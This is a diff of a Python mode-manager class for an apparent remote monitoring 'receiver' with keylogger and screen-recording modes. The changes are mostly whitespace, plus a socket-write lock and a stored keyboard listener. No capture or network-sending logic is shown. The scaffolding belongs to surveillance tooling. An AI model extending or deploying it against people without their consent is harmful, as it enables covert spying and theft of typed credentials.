@@ -8,6 +8,7 @@ from enum import Enum
 
 class Mode(Enum):
     """Operating modes for the receiver"""
+
     NORMAL = "normal"
     KEYLOGGER = "keylogger"
     SCREENRECORD = "screenrecord"
@@ -17,17 +18,21 @@ class Mode(Enum):
 
 class ModeManager:
     """Manages the current operating mode and active tasks"""
-    
+
     def __init__(self):
         self.current_mode = Mode.NORMAL
         self.active_thread = None
         self.stop_event = threading.Event()
         self.mode_lock = threading.Lock()
-        
+        self.socket_write_lock = (
+            threading.RLock()
+        )  # Reentrant lock for socket writes - prevents nested acquisition deadlocks
+
         # Mode-specific data storage
         self.keylog_buffer = []
         self.recording_metadata = {}
-    
+        self.keylogger_listener = None  # Stores active keyboard listener for immediate stopping
+
     def set_mode(self, mode: Mode) -> bool:
         """
         Set the current mode (thread-safe).
@@ -38,24 +43,24 @@ class ModeManager:
                 return False
             self.current_mode = mode
             return True
-    
+
     def reset_mode(self):
         """Reset to NORMAL mode (thread-safe)"""
         with self.mode_lock:
             self.current_mode = Mode.NORMAL
             self.stop_event.clear()
             self.active_thread = None
-    
+            self.keylogger_listener = None
+
     def signal_stop(self):
         """Signal the active task to stop"""
         self.stop_event.set()
-    
+
     def is_stopping(self) -> bool:
         """Check if stop has been signaled"""
         return self.stop_event.is_set()
-    
+
     def wait_for_thread(self, timeout=5):
         """Wait for active thread to finish"""
         if self.active_thread and self.active_thread.is_alive():
             self.active_thread.join(timeout=timeout)
-
